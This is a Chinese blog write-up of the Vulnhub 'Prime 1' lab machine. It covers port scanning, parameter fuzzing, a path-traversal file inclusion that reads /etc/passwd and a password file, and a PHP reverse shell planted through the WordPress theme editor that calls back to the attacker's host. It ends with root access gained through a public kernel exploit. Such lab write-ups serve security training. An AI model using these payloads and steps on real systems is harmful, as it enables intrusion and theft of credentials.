---
title: Vulnhub-Prime 1
published: 2025-03-09 16:17:52
tags: [Vulnhub]
category: 靶机
draft: false
---

# Prime 1

> [https://www.vulnhub.com/entry/prime-1,358/](https://www.vulnhub.com/entry/prime-1,358/)
> 

## 主机发现端口扫描

1. 探测存活主机，137是靶机
    
    ```php
    nmap -sP 192.168.75.0/24 
    //                       
    Starting Nmap 7.93 ( https://nmap.org ) at 2024-09-22 16:25 CST
    Nmap scan report for 192.168.75.1
    Host is up (0.00028s latency).
    MAC Address: 00:50:56:C0:00:08 (VMware)
    Nmap scan report for 192.168.75.2
    Host is up (0.00026s latency).
    MAC Address: 00:50:56:FB:CA:45 (VMware)
    Nmap scan report for 192.168.75.137
    Host is up (0.0010s latency).
    MAC Address: 00:0C:29:69:EE:71 (VMware)
    Nmap scan report for 192.168.75.254
    Host is up (0.00018s latency).
    MAC Address: 00:50:56:F8:B3:1A (VMware)
    Nmap scan report for 192.168.75.131
    Host is up.
    ```
    
2. 扫描靶机所有开放端口
    
    ```php
    nmap -sT -min-rate 10000 -p- 192.168.75.137        
    //                   
    Starting Nmap 7.93 ( https://nmap.org ) at 2024-09-22 17:54 CST
    Nmap scan report for 192.168.75.137
    Host is up (0.0014s latency).
    Not shown: 65533 closed tcp ports (conn-refused)
    PORT   STATE SERVICE
    22/tcp open  ssh
    80/tcp open  http
    MAC Address: 00:0C:29:69:EE:71 (VMware)
    ```
    
3. 扫描服务版本及系统版本
    
    ```php
    nmap -sT -sV -O -p22,80 192.168.75.137           
    //                     
    Starting Nmap 7.93 ( https://nmap.org ) at 2024-09-22 17:57 CST
    Nmap scan report for 192.168.75.137
    Host is up (0.00045s latency).
    
    PORT   STATE SERVICE VERSION
    22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
    80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
    MAC Address: 00:0C:29:69:EE:71 (VMware)
    Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
    Device type: general purpose
    Running: Linux 3.X|4.X
    OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4
    OS details: Linux 3.2 - 4.9
    Network Distance: 1 hop
    Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
    
    ```
    
4. udp扫描
    
    ```php
    nmap -sU 192.168.75.137  
    //                       
    Starting Nmap 7.93 ( https://nmap.org ) at 2024-09-22 17:57 CST
    Nmap scan report for 192.168.75.137
    Host is up (0.00073s latency).
    Not shown: 997 closed udp ports (port-unreach)
    PORT     STATE         SERVICE
    68/udp   open|filtered dhcpc
    631/udp  open|filtered ipp
    5353/udp open|filtered zeroconf
    MAC Address: 00:0C:29:69:EE:71 (VMware)
    ```
    
5. 扫描漏洞
    
    ```php
    nmap -script=vuln -p 22,80, 192.168.75.137       
    //
    PORT   STATE SERVICE
    22/tcp open  ssh
    80/tcp open  http
    |_http-vuln-cve2017-1001000: ERROR: Script execution failed (use -d to debug)
    | http-slowloris-check: 
    |   VULNERABLE:
    |   Slowloris DOS attack
    |     State: LIKELY VULNERABLE
    |     IDs:  CVE:CVE-2007-6750
    |       Slowloris tries to keep many connections to the target web server open and hold
    |       them open as long as possible.  It accomplishes this by opening connections to
    |       the target web server and sending a partial request. By doing so, it starves
    |       the http server's resources causing Denial Of Service.
    |       
    |     Disclosure date: 2009-09-17
    |     References:
    |       http://ha.ckers.org/slowloris/
    |_      https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2007-6750
    |_http-csrf: Couldn't find any CSRF vulnerabilities.
    |_http-stored-xss: Couldn't find any stored XSS vulnerabilities.
    | http-enum: 
    |   /wordpress/: Blog
    |_  /wordpress/wp-login.php: Wordpress login page.
    |_http-dombased-xss: Couldn't find any DOM based XSS.
    MAC Address: 00:0C:29:69:EE:71 (VMware)
    ```
    
    扫描出 `slowloris DOS`用不上，以及`cve2017-1001000` ，并且扫出存在`wordpress` 版本是<`4.7.2`的，因为能扫描出`cve2017-1001000`
    
6. Nikto漏洞扫描
    
    ```php
    nikto -host 192.168.75.137 -port 22,80
    //
    - Nikto v2.5.0
    ---------------------------------------------------------------------------
    ---------------------------------------------------------------------------
    + Target IP:          192.168.75.137
    + Target Hostname:    192.168.75.137
    + Target Port:        80
    + Start Time:         2024-09-22 18:44:45 (GMT8)
    ---------------------------------------------------------------------------
    + Server: Apache/2.4.18 (Ubuntu)
    + /: The anti-clickjacking X-Frame-Options header is not present. See: https://developer.mozill.org/en-US/docs/Web/HTTP/Headers/X-Frame-Options
    + /: The X-Content-Type-Options header is not set. This could allow the user agent to render th content of the site in a different fashion to the MIME type. See: https://www.netsparker.com/wb-vulnerability-scanner/vulnerabilities/missing-content-type-header/
    + No CGI Directories found (use '-C all' to force check all possible dirs)
    + Apache/2.4.18 appears to be outdated (current is at least Apache/2.4.54). Apache 2.2.34 is th EOL for the 2.x branch.
    + /: Web Server returns a valid response with junk HTTP methods which may cause false positives
    + /icons/README: Apache default file found. See: https://www.vntweb.co.uk/apache-restricting-access-to-iconsreadme/                                                                           
    + /wordpress/wp-content/plugins/akismet/readme.txt: The WordPress Akismet plugin 'Tested up to' version usually matches the WordPress version.                                                
    + /wordpress/wp-links-opml.php: This WordPress script reveals the installed version.           
    + /wordpress/wp-admin/: Uncommon header 'x-redirect-by' found, with contents: WordPress.       
    + /wordpress/: Drupal Link header found with value: <http://192.168.75.137/wordpress/index.php?rest_route=/>; rel="https://api.w.org/". See: https://www.drupal.org/                          
    + /wordpress/: A Wordpress installation was found.
    + /wordpress/wp-login.php?action=register: Cookie wordpress_test_cookie created without the httponly flag. See: https://developer.mozilla.org/en-US/docs/Web/HTTP/Cookies
    + /wordpress/wp-content/uploads/: Directory indexing found.
    + /wordpress/wp-content/uploads/: Wordpress uploads directory is browsable. This may reveal sensitive information.
    + /wordpress/wp-login.php: Wordpress login found.
    + 8106 requests: 0 error(s) and 14 item(s) reported on remote host
    + End Time:           2024-09-22 18:45:09 (GMT8) (24 seconds)
    ---------------------------------------------------------------------------
    + 1 host(s) tested
    
    ```
    

## web渗透

1. 爆破目录，`192.168.75.137`
    
    ```php
    [18:49:23] 200 -  131B  - /dev
    [18:49:25] 200 -  137B  - /image.php
    [18:49:26] 301 -  321B  - /javascript  ->  http://192.168.75.137/javascript/
    [18:49:32] 403 -  279B  - /server-status/
    [18:49:32] 403 -  279B  - /server-status
    [18:49:36] 200 -    1KB - /wordpress/wp-login.php
    [18:49:36] 200 -    4KB - /wordpress/
    ```
    
    查看`/dev` ，因为它不是一个正常该有的目录
    
    ```php
    hello,
    
    now you are at level 0 stage.
    
    In real life pentesting we should use our tools to dig on a web very hard.
    
    Happy hacking. 
    ```
    
    意思是让我们更努力的去爆破目录？
    
2.  `python .\dirsearch.py -u http://192.168.75.137/ --suffixes .txt,.zip` 给字典加上`.txt,.zip` 后缀去爆破
    
    ```php
    http://192.168.75.137/secret.txt
    ```
    
    查看内容得出
    
    ```php
    Looks like you have got some secrets.
    
    Ok I just want to do some help to you. 
    
    Do some more fuzz on every page of php which was finded by you. And if
    you get any right parameter then follow the below steps. If you still stuck 
    Learn from here a basic tool with good usage for OSCP.
    
    https://github.com/hacknpentest/Fuzzing/blob/master/Fuzz_For_Web
    
    //see the location.txt and you will get your next move//
    ```
    
    让我们进行`fuzz`爆破，大概意思是让我们在所有`php`文件进行`fuzz` ，大概就是让我们`fuzz`出`get`参数
    
3. 扫描出所有`php`文件
    
    ```php
    irb http://192.168.75.137 -X .php               
    
    -----------------
    DIRB v2.22    
    By The Dark Raver
    -----------------
    
    START_TIME: Sun Sep 22 20:12:05 2024
    URL_BASE: http://192.168.75.137/
    WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt
    EXTENSIONS_LIST: (.php) | (.php) [NUM = 1]
    
    -----------------
    
    GENERATED WORDS: 4612                                                          
    
    ---- Scanning URL: http://192.168.75.137/ ----
    + http://192.168.75.137/image.php (CODE:200|SIZE:147)                                                                                      
    + http://192.168.75.137/index.php (CODE:200|SIZE:136)                                                                                      
                                                                                                                                               
    -----------------
    END_TIME: Sun Sep 22 20:12:08 2024
    DOWNLOADED: 4612 - FOUND: 2
    ```
    
    当前目录下只有两个php文件我们两个都试试
    
4. 对`index.php`进行`fuzz`
    
    注意 `--hh 136` 需要对视情况进行调整，过滤掉其他结果后，最后得出`file`这个参数
    
    ```php
    wfuzz -c -w /usr/share/wfuzz/wordlist/general/common.txt --hh 136 http://192.168.75.137/index.php?FUZZ=something
    //hh 过滤掉了 字长为136的数据
    ********************************************************
    * Wfuzz 3.1.0 - The Web Fuzzer                         *
    ********************************************************
    
    Target: http://192.168.75.137/index.php?FUZZ=something
    Total requests: 951
    
    =====================================================================
    ID           Response   Lines    Word       Chars       Payload                       
    =====================================================================
    
    000000341:   200        7 L      19 W       206 Ch      "file"                        
    
    Total time: 1.060608
    Processed Requests: 951
    Filtered Requests: 950
    Requests/sec.: 896.6547
    
    ```
    
5. 访问`http://192.168.75.137/index.php?file=` 
    
    ```php
    提示：Do something better you are digging wrong file
    ```
    
    可能file的参数也需要我们进行`fuzz`，其实这事`burp`也可以做
    
    但是之前的`secret.txt`还有一句 : //see the `location.txt` and you will get your next move//
    
    所以我们访问 ：`http://192.168.75.137/index.php?file=location.txt` 
    
    果然存在有信息
    
    ```php
    Now dig some more for next one
    use 'secrettier360' parameter on some other php page for more fun. 
    ```
    
    让我们使用`secrettier360` 参数去别的`php`页面`fuzz` ，大概是
    
    别的`php`页面除了`index.php`那就是`image.php` 
    
6. 对`image.php` 进行`fuzz`
    
    ```php
    wfuzz -c -w /usr/share/wfuzz/wordlist/general/common.txt --hh 197 http://192.168.75.137/image.php?secrettier360=FUZZ
    ********************************************************
    * Wfuzz 3.1.0 - The Web Fuzzer                         *
    ********************************************************
    
    Target: http://192.168.75.137/image.php?secrettier360=FUZZ
    Total requests: 951
    
    =====================================================================
    ID           Response   Lines    Word       Chars       Payload                       
    =====================================================================
    
    000000257:   200        13 L     43 W       328 Ch      "dev"                         
    
    Total time: 1.031432
    Processed Requests: 951
    Filtered Requests: 950
    Requests/sec.: 922.0189
    ```
    
    得出参数`dev` ，尝试访问：`http://192.168.75.137/image.php?secrettier360=dev`
    
    ```php
    finaly you got the right parameter
    
    hello, now you are at level 0 stage. In real life pentesting we should use our tools to dig on a web very hard. Happy hacking. 
    ```
    
    WTF？这不是之前的`/dev`吗，但是发现你只要在`secrettier360` 加上文件名，那不就是文件包含了吗?我这里大发奇想使用`php伪协议`尝试，但是发现使用不了，应该是禁用了
    
7. 利用文件包含漏洞
    
    尝试读取`/etc/passwd`
    
    ```php
    http://192.168.75.137/image.php?secrettier360=../../../etc/passwd
    //
    root:x:0:0:root:/root:/bin/bash daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin 
    bin:x:2:2:bin:/bin:/usr/sbin/nologin sys:x:3:3:sys:/dev:/usr/sbin/nologin 
    sync:x:4:65534:sync:/bin:/bin/sync games:x:5:60:games:/usr/games:/usr/sbin/nologin 
    man:x:6:12:man:/var/cache/man:/usr/sbin/nologin 
    lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin 
    mail:x:8:8:mail:/var/mail:/usr/sbin/nologin 
    news:x:9:9:news:/var/spool/news:/usr/sbin/nologin 
    uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin 
    proxy:x:13:13:proxy:/bin:/usr/sbin/nologin 
    www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin 
    backup:x:34:34:backup:/var/backups:/usr/sbin/nologin 
    list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin 
    irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin 
    gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin 
    nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin 
    systemd-timesync:x:100:102:systemd Time Synchronization,,,:/run/systemd:/bin/false 
    systemd-network:x:101:103:systemd Network Management,,,:/run/systemd/netif:/bin/false 
    systemd-resolve:x:102:104:systemd Resolver,,,:/run/systemd/resolve:/bin/false 
    systemd-bus-proxy:x:103:105:systemd Bus Proxy,,,:/run/systemd:/bin/false 
    syslog:x:104:108::/home/syslog:/bin/false 
    _apt:x:105:65534::/nonexistent:/bin/false 
    messagebus:x:106:110::/var/run/dbus:/bin/false 
    uuidd:x:107:111::/run/uuidd:/bin/false 
    lightdm:x:108:114:Light Display Manager:/var/lib/lightdm:/bin/false 
    whoopsie:x:109:117::/nonexistent:/bin/false 
    avahi-autoipd:x:110:119:Avahi autoip daemon,,,:/var/lib/avahi-autoipd:/bin/false 
    avahi:x:111:120:Avahi mDNS daemon,,,:/var/run/avahi-daemon:/bin/false 
    dnsmasq:x:112:65534:dnsmasq,,,:/var/lib/misc:/bin/false 
    colord:x:113:123:colord colour management daemon,,,:/var/lib/colord:/bin/false 
    speech-dispatcher:x:114:29:Speech Dispatcher,,,:/var/run/speech-dispatcher:/bin/false 
    hplip:x:115:7:HPLIP system user,,,:/var/run/hplip:/bin/false 
    kernoops:x:116:65534:Kernel Oops Tracking Daemon,,,:/:/bin/false 
    pulse:x:117:124:PulseAudio daemon,,,:/var/run/pulse:/bin/false 
    rtkit:x:118:126:RealtimeKit,,,:/proc:/bin/false 
    saned:x:119:127::/var/lib/saned:/bin/false 
    usbmux:x:120:46:usbmux daemon,,,:/var/lib/usbmux:/bin/false 
    victor:x:1000:1000:victor,,,:/home/victor:/bin/bash 
    mysql:x:121:129:MySQL Server,,,:/nonexistent:/bin/false 
    saket:x:1001:1001:find password.txt file in my directory:/home/saket: 
    sshd:x:122:65534::/var/run/sshd:/usr/sbin/nologin 
    ```
    
    发现`saket:x:1001:1001:find password.txt file in my directory:/home/saket:` ，好好好
    
    ```php
    http://192.168.75.137/image.php?secrettier360=../../../home/saket/password.txt
    //
    finaly you got the right parameter
    
    follow_the_ippsec 
    ```
    
    密码应该是`follow_the_ippsec`
    
8. 登录wordpress后台，用户名`victor`，密码`follow_the_ippsec` 
    
    为什么用户名是`victor` ，因为`wordpress/index.php`里面第一条信息就是`victor` 发布的，所以猜测用户名是`victor` ，成功进入后台
    

## 后台利用获得初级shell

1. 进入后台，`plugins` → `Add New` → `upload plugins` ,上传反弹shell文件
    
    ![image.png](image%2014.png)
    
    发现没有上传权限，即使设置关闭了以月份创建文件夹
    
2. 寻找别的地方上传shellcode
    
    在`Appearance`→`Theme Editor` →`secret.php` 找到了可编辑保存的文件
    
    我们将shellcode输进去
    
    ```php
    <?php exec("/bin/bash -c 'bash -i >& /dev/tcp/192.168.75.131/1234 0>&1'");?>
    ```
    
    然后`save` 
    
3. kali开启监听，并且访问
    
    ```php
    http://192.168.75.137/wordpress/wp-content/themes/twentynineteen/secret.php
    ```
    
    ```php
    nc -lvp 1234                          
    listening on [any] 1234 ...
    192.168.75.137: inverse host lookup failed: Unknown host
    connect to [192.168.75.131] from (UNKNOWN) [192.168.75.137] 42312
    bash: cannot set terminal process group (48712): Inappropriate ioctl for device
    bash: no job control in this shell
    www-data@ubuntu:/var/www/html/wordpress/wp-content/themes/twentynineteen$ 
    ```
    
    获得初级shell
    

## 提权

1. 查看权限
    
    ```php
    www-data@ubuntu:/var/www/html/wordpress/wp-content/themes/twentynineteen$ sudo -l                    
    Matching Defaults entries for www-data on ubuntu:
        env_reset, mail_badpass,
        secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
    User www-data may run the following commands on ubuntu:
        (root) NOPASSWD: /home/saket/enc
    //
    www-data@ubuntu:/var/www/html/wordpress/wp-content/themes/twentynineteen$ uname -a              
    Linux ubuntu 4.10.0-28-generic #32~16.04.2-Ubuntu SMP Thu Jul 20 10:19:48 UTC 2017 x86_64 x86_64 x86_64 GNU/Linux
    ```
    
    `www-data` 用户被授予了在 Ubuntu 系统上以 `root` 权限运行 `/home/saket/enc` 命令，而无需输入密码
    
    **`/home/saket/enc`**：这是一个具体的可执行文件或脚本的路径，`www-data` 用户可以以 `root` 身份执行它
    
    但是`enc`发现执行时还是需要输入密码，尝试利用别的
    
2. 尝试内核漏洞
    
    ```php
    searchsploit linux kernel 4.10.0-28 | grep 'Local Privilege'
    Linux Kernel (Solaris 10 / < 5.10 138888-01) - Local Privilege Escalation                                 | solaris/local/15962.c
    Linux Kernel 2.6.19 < 5.9 - 'Netfilter Local Privilege Escalation                                         | linux/local/50135.c
    Linux Kernel 4.10 < 5.1.17 - 'PTRACE_TRACEME' pkexec Local Privilege Escalation                           | linux/local/47163.c
    Linux Kernel 4.8.0 UDEV < 232 - Local Privilege Escalation                                                | linux/local/41886.c
    Linux Kernel < 4.11.8 - 'mq_notify: double sock_put()' Local Privilege Escalation                         | linux/local/45553.c
    Linux Kernel < 4.13.9 (Ubuntu 16.04 / Fedora 27) - Local Privilege Escalation                             | linux/local/45010.c
    ```
    
    尝试最后一个 `45010.c` 然后把`45010.c`传到靶机，编译运行,记得给`执行`权限
    
    ```php
    gcc 45010.c -o 45010
    chmod u+x 45010
    ./45010
    ```
    
    ```php
    www-data@ubuntu:/tmp$ ./45010
    //
    uname -a
    Linux ubuntu 4.10.0-28-generic #32~16.04.2-Ubuntu SMP Thu Jul 20 10:19:48 UTC 2017 x86_64 x86_64 x86_64 GNU/Linux
    //
    whoami 
    root
    ```
    
    提权成功，读取flag文件
    
    ```php
    python -c "import pty;pty.spawn('/bin/bash')"    
    //
    root@ubuntu:/tmp# cd /root
    root@ubuntu:/root# ls
    enc  enc.cpp  enc.txt  key.txt  root.txt  sql.py  t.sh  wfuzz  wordpress.sql
    //
    root@ubuntu:/root# cat key.txt
    ```
    
    ```php
    I know you are the fan of ippsec.
    
    So convert string "ippsec" into md5 hash and use it to gain yourself in your real form.
    ```